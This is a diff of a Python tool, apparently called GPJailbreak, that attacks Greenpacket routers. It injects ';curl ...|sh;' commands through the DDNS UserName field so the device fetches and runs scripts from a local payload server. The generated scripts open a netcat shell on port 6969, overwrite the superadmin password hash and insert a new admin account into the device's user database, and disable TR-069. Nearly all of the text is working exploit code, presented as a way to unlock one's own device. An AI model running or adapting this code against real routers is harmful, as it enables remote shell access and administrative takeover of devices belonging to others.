@@ -4,11 +4,16 @@ import socketserver
 
 # Local settings for http payload server
 settings_localip = "192.168.0.100"
-settings_localport = 18080
+settings_localport = 8080
 # Greenpacket settings
 settings_remote_ip = "192.168.0.1"
 settings_user = "superadmin"
 settings_password = "admin"
+
+# Might not be needed outside browser
+add_lan_headers = False
+# D2U has 31 char limit
+short_payload = False
 
 class httpd:
     def __init__(self, host='localhost', port=8000, directory='.'):
@@ -87,6 +92,10 @@ def session_get(bearer, url, jsondata):
         print(f" malformed JSON: {e}")
         return False
 
+def payload_writer(file,cmd):
+    payload_sh = open(f'payloads/{file}', 'w')
+    payload_sh.write(f'{cmd}\n')
+    payload_sh.close()
 
 
 session = session_login()
@@ -104,7 +113,7 @@ if(session[0]):
     ddns_clear = {'Service':'Disable','UserName':'','Password':'','HostName':'','Status':'','InternetIpAddress':''}
 
     while(True):
-        print("======================================\n\n\tGPJailbreak v1.2\n\nOptions:\n\t1. Test connection\n\t2. Start netcat shell\n\t3. Disable TR-069\n\t4. Set superadmin password\n\t5. Add a superadmin account\n\t6. Unblock Command Shell\n\t7. Set proper firewall.\n\t8. Quit\n\n======================================")
+        print("======================================\n\n\tGPJailbreak\n\nOptions:\n\t1. Test connection\n\t2. Start netcat shell\n\t3. Disable TR-069\n\t4. Set superadmin password\n\t5. Add a superadmin account\n\t6. Unblock Command Shell\n\t7. Set proper firewall.\n\t8. Quit\n\n======================================")
         picker = input("==> ")
         match picker[0]:
             case '1':
@@ -122,16 +131,24 @@ if(session[0]):
             case '2':
                 print("Launching Ncat shell...")
                 payload = ddns_cmd_inject
-                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/ncat.sh | sh;"
-                # Generate payload on the fly to fill LAN ip correctly, default firewall is crap and lets both IPv4/6 access SSH that is on by default....
-                payload_sh = open('payloads/ncat.sh', 'w')
-                payload_sh.write(f'nohup nc -ll -p 6969 {settings_remote_ip} -e /bin/sh >/dev/null 2>&1 &\n')
-                payload_sh.close()
+                payload_cmd = ""
 
+                # Generate payload on the fly to fill LAN ip correctly, default firewall is crap and lets both IPv4/6 access SSH that is on by default....
+                if short_payload:
+                    payload_cmd = f";curl {settings_localip}:{settings_localport}/a|sh;"
+                    if len(payload_cmd) > 31:
+                        print(f"WARN: Payload too long ({len(payload_cmd)}) for this device and might not work")
+                    payload_writer('a', f'nohup nc -ll -p 6969 {settings_remote_ip} -e /bin/sh >/dev/null 2>&1 &')
+                else:
+                    payload_cmd = f";timeout 5 curl http://{settings_localip}:{settings_localport}/ncat.sh | sh;"
+                    payload_writer('ncat.sh', 'nohup nc -ll -p 6969 {settings_remote_ip} -e /bin/sh >/dev/null 2>&1 &')
+
+                payload["UserName"] = payload_cmd
                 result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
                 if(result1[0]):
+                    print(result1)
                     print(f"Ncat lisener started at {settings_remote_ip}:6969 !\nStop it by sending kill $(pgrep nc) to the device.")
-                time.sleep(6)
+                time.sleep(1)
                 result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
                 if(result2[0]):
                    print("Settings cleanup ok")
@@ -139,7 +156,16 @@ if(session[0]):
             case '3':
                 print("Starting TR-069 removal...")
                 payload = ddns_cmd_inject
-                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/tr069.sh | sh;"
+                payload_cmd = ""
+                if short_payload:
+                    payload_cmd = f";curl {settings_localip}:{settings_localport}/a|sh;"
+                    if len(payload_cmd) > 31:
+                        print("WARN: Payload too long for this device and might not work")
+                    shutil.copy2('payloads/tr069.sh', 'payloads/a')
+                else:
+                    payload_cmd = f";timeout 5 curl http://{settings_localip}:{settings_localport}/tr069.sh | sh;"
+
+                payload["UserName"] = payload_cmd
                 # Hopefully this accualy saves systemctl too, H5 doesn't have a typical overlayfs setup
                 result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
                 if(result1[0]):
@@ -152,16 +178,19 @@ if(session[0]):
             case '4':
                 print("Setting new superadmin password...")
                 payload = ddns_cmd_inject
-                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/superadmin.sh | sh;"
-
-                userpassword = ''.join(random.choices("1234567890qwertzuiopASDFGHJKLyxcvbnm", k=16))
+                payload_cmd = ""
                 # Note that other devices like D5H don't have a superadmin account, more work needed
-                # Zain and Irancell firmwares only have admin user with extra settings for restricting user access from LAN/WAN
-                payload_sh = open('payloads/superadmin.sh', 'w')
-                payload_sh.write(f'\n')
-                payload_sh.write(f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\n')
-                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "UPDATE users SET password = \'$passwdmd5\' WHERE username = \'superadmin\'";\n')
-                payload_sh.close()
+                # Zain and Irancell firmwares only have admin user with extra settings for restricting user access from WAN
+                userpassword = ''.join(random.choices("1234567890qwertzuiopASDFGHJKLyxcvbnm", k=16))
+                if short_payload:
+                    payload_cmd = f";curl {settings_localip}:{settings_localport}/a|sh;"
+                    if len(payload_cmd) > 31:
+                        print("WARN: Payload too long for this device and might not work")
+                    payload_writer('a', f'passwdmd5=`echo -n { ''.join(random.choices("1234567890qwertzuiopASDFGHJKLyxcvbnm", k=16)) } |md5sum|cut -d" " -f1`\nsqlite3 /data/turin/web/datas/memohi.db "UPDATE users SET password = \'$passwdmd5\' WHERE username = \'superadmin\'";\n')
+                else:
+                    payload_cmd = f";timeout 5 curl http://{settings_localip}:{settings_localport}/superadmin.sh | sh;"
+                    payload_writer('superadmin.sh', f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\nsqlite3 /data/turin/web/datas/memohi.db "UPDATE users SET password = \'$passwdmd5\' WHERE username = \'superadmin\'";\n')
+                payload["UserName"] = payload_cmd
 
                 result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
                 if(result1[0]):
@@ -174,17 +203,18 @@ if(session[0]):
             case '5':
                 print("Adding new superadmin account...")
                 payload = ddns_cmd_inject
-                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/adduser.sh | sh;"
+                payload_cmd = ""
 
                 username = f"superadmin{random.randint(10, 99)}"
                 userpassword = ''.join(random.choices("1234567890qwertzuiopASDFGHJKLyxcvbnm", k=16))
-
-                payload_sh = open('payloads/adduser.sh', 'w')
-                payload_sh.write(f'\n')
-                payload_sh.write(f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\n')
-                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "delete from users where id=\'69\'"\n') # Delete old user with this ID
-                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "INSERT INTO users (\'id\', \'username\', \'password\', \'roletype\', \'firstlogin\') VALUES (69, \'{username}\', \'$passwdmd5\', \'admin\', false);"\n')
-                payload_sh.close()
+                if short_payload:
+                    payload_cmd = f";curl {settings_localip}:{settings_localport}/a |sh;"
+                    if len(payload_cmd) > 31:
+                        print("WARN: Payload too long for this device and might not work")
+                    payload_writer('a', f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\nsqlite3 /data/turin/web/datas/memohi.db "delete from users where id=\'69\'"\nsqlite3 /data/turin/web/datas/memohi.db "INSERT INTO users (\'id\', \'username\', \'password\', \'roletype\', \'firstlogin\') VALUES (69, \'{username}\', \'$passwdmd5\', \'admin\', false);"\n')
+                else:
+                    payload_cmd = f";timeout 5 curl http://{settings_localip}:{settings_localport}/adduser.sh | sh;"
+                    payload_writer('adduser.sh', f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\nsqlite3 /data/turin/web/datas/memohi.db "delete from users where id=\'69\'"\nsqlite3 /data/turin/web/datas/memohi.db "INSERT INTO users (\'id\', \'username\', \'password\', \'roletype\', \'firstlogin\') VALUES (69, \'{username}\', \'$passwdmd5\', \'admin\', false);"\n')
 
                 result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
                 if(result1[0]):
@@ -198,7 +228,7 @@ if(session[0]):
                 print("Unlocking Command Shell...")
                 device_status = session_get(session_token, '/web/v1/setting/deviceinfo', '')
                 # Calls to cped service over ubus, unsure how usefull it is outside just reading statistics. Output buffer is quite small
-.               # If firmware has the shell menu hidden you can still send commands with requests :)
+                # If firmware has the shell menu hidden you can still send commands with requests :)
                 if( device_status[0] ):
                     device_imei = device_status[1]["IMEI"]
                     imei_b64 =  base64.b64encode(bytes(device_imei,"utf8")).decode("utf-8")
